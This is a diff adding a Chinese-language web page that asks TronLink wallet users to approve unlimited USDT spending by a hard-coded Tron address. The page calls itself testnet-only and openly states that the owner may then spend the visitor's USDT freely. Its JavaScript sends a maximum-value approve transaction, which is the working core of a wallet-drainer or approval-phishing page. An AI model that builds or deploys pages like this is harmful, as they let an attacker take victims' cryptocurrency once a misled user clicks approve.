@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>USDT 授权给我的地址</title>
+  <style>
+    body { font-family: system-ui; text-align: center; padding: 50px; background: #f0f0f0; }
+    button { padding: 15px 30px; font-size: 18px; background: #00b386; color: white; border: none; border-radius: 8px; cursor: pointer; }
+    button:hover { background: #009973; }
+  </style>
+</head>
+<body>
+  <h1>🔐 USDT 授权页面</h1>
+  <p>授权后，我（地址：<strong>TZDwArQKa2Wn53ZrU8RcUVt3EvX5goVJmP</strong>）可以无限使用你的 USDT</p>
+  <p>（测试网，仅用于测试）</p>
+  <button onclick="approveUSDT()">✅ 立即授权无限 USDT</button>
+
+  <script>
+    async function approveUSDT() {
+      // 检查是否在 TronLink 环境中打开
+      if (!window.tronWeb || !window.tronLink) {
+        alert("请在 TronLink 钱包的 DApp 浏览器中打开此页面！");
+        return;
+      }
+
+      try {
+        // 连接钱包
+        await window.tronLink.request({ method: 'tron_requestAccounts' });
+
+        const tronWeb = window.tronWeb;
+        const USDT_ADDRESS = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf"; // 测试网 USDT
+        const MY_SPENDER = "TZDwArQKa2Wn53ZrU8RcUVt3EvX5goVJmP";   // 你的地址
+        const MAX_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // 无限额度
+
+        // USDT 的 approve 函数 ABI（只需这一段就够）
+        const abi = [{
+          "constant": false,
+          "inputs": [{"name": "spender", "type": "address"}, {"name": "value", "type": "uint256"}],
+          "name": "approve",
+          "outputs": [{"name": "", "type": "bool"}],
+          "payable": false,
+          "stateMutability": "nonpayable",
+          "type": "function"
+        }];
+
+        const contract = await tronWeb.contract(abi, USDT_ADDRESS);
+
+        // 发送授权交易
+        const tx = await contract.approve(MY_SPENDER, MAX_AMOUNT).send({
+          feeLimit: 100000000
+        });
+
+        alert("✅ 授权成功！\n交易ID：" + tx + "\n你现在可以用我的地址随意调动你的 USDT 了！");
+        console.log("授权交易成功:", tx);
+      } catch (error) {
+        console.error(error);
+        alert("授权失败：" + error.message);
+      }
+    }
+  </script>
+</body>
+</html>
